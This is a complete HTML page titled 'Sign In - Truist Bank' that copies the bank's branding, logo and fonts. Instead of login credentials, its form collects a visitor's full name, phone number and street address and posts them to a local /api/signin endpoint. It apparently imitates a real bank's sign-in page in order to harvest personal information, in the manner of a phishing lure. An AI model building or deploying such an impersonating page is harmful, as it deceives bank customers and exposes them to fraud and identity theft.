<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign In - Truist Bank</title>
    
    <style>
        @font-face {
            font-family: 'Truist Trio';
            src:
                url('fonts/TruistTrio_W_Rg.woff2') format('woff2'),
                url('fonts/TruistTrio_W_Rg.woff') format('woff'),
                url('fonts/TruistTrio_Rg.ttf') format('truetype');
            font-style: normal;
            font-weight: normal;
        }

        @font-face {
            font-family: 'Truist Trio Light';
            src:
                url('fonts/TruistTrio_W_Lt.woff2') format('woff2'),
                url('fonts/TruistTrio_W_Lt.woff') format('woff'),
                url('fonts/TruistTrio_Lt.ttf') format('truetype');
            font-style: normal;
            font-weight: normal;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Truist Trio', Arial, sans-serif;
            background: linear-gradient(135deg, #563E7C 0%, #2E1A47 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .signin-container {
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
            max-width: 500px;
            width: 100%;
            padding: 40px;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
        }

        .logo img {
            height: 40px;
        }

        h1 {
            font-family: 'Truist Trio Light', 'Truist Trio', Arial, sans-serif;
            color: #2E1A47;
            font-size: 32px;
            font-weight: 200;
            margin-bottom: 10px;
            text-align: center;
        }

        .subtitle {
            color: #7C6992;
            font-size: 16px;
            text-align: center;
            margin-bottom: 30px;
        }

        .form-group {
            margin-bottom: 24px;
        }

        label {
            display: block;
            color: #2E1A47;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #E0E0E0;
            border-radius: 8px;
            font-size: 16px;
            font-family: 'Truist Trio', Arial, sans-serif;
            transition: border-color 0.3s ease;
        }

        input:focus {
            outline: none;
            border-color: #563E7C;
        }

        input::placeholder {
            color: #B0B0B0;
        }

        .btn-submit {
            width: 100%;
            background: #563E7C;
            color: white;
            border: none;
            padding: 16px;
            border-radius: 8px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s ease;
            font-family: 'Truist Trio', Arial, sans-serif;
        }

        .btn-submit:hover {
            background: #2E1A47;
        }

        .btn-submit:disabled {
            background: #C9C9C9;
            cursor: not-allowed;
        }

        .back-link {
            text-align: center;
            margin-top: 20px;
        }

        .back-link a {
            color: #563E7C;
            text-decoration: none;
            font-size: 14px;
        }

        .back-link a:hover {
            text-decoration: underline;
        }

        @media (max-width: 600px) {
            .signin-container {
                padding: 30px 20px;
            }

            h1 {
                font-size: 28px;
            }
        }
    </style>
</head>
<body>
    <div class="signin-container">
        <div class="logo">
            <img src="images/truist-logo-purple.svg" alt="Truist">
        </div>
        
        <h1>Sign In</h1>
        <p class="subtitle">Please enter your information to continue</p>
        
        <form id="signinForm">
            <div class="form-group">
                <label for="fullName">Full Name</label>
                <input 
                    type="text" 
                    id="fullName" 
                    name="fullName" 
                    placeholder="Enter your full name"
                    required
                >
            </div>
            
            <div class="form-group">
                <label for="phone">Phone Number</label>
                <input 
                    type="tel" 
                    id="phone" 
                    name="phone" 
                    placeholder="(555) 123-4567"
                    required
                >
            </div>
            
            <div class="form-group">
                <label for="address">Address</label>
                <input 
                    type="text" 
                    id="address" 
                    name="address" 
                    placeholder="Enter your street address"
                    required
                >
            </div>
            
            <button type="submit" class="btn-submit">Continue</button>
        </form>
        
        <div class="back-link">
            <a href="/">Back to Home</a>
        </div>
    </div>

    <script>
        document.getElementById('signinForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const fullName = document.getElementById('fullName').value;
            const phone = document.getElementById('phone').value;
            const address = document.getElementById('address').value;
            
            if (fullName && phone && address) {
                const submitButton = this.querySelector('.btn-submit');
                submitButton.disabled = true;
                submitButton.textContent = 'Submitting...';
                
                try {
                    const response = await fetch('/api/signin', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({ fullName, phone, address })
                    });
                    
                    if (response.ok) {
                        alert('Thank you! Your information has been submitted.\n\nName: ' + fullName + '\nPhone: ' + phone + '\nAddress: ' + address);
                        this.reset();
                    } else {
                        alert('There was an error submitting your information. Please try again.');
                    }
                } catch (error) {
                    alert('There was an error submitting your information. Please try again.');
                } finally {
                    submitButton.disabled = false;
                    submitButton.textContent = 'Continue';
                }
            }
        });

        const phoneInput = document.getElementById('phone');
        phoneInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length > 0) {
                if (value.length <= 3) {
                    value = '(' + value;
                } else if (value.length <= 6) {
                    value = '(' + value.slice(0, 3) + ') ' + value.slice(3);
                } else {
                    value = '(' + value.slice(0, 3) + ') ' + value.slice(3, 6) + '-' + value.slice(6, 10);
                }
            }
            e.target.value = value;
        });
    </script>
</body>
</html>
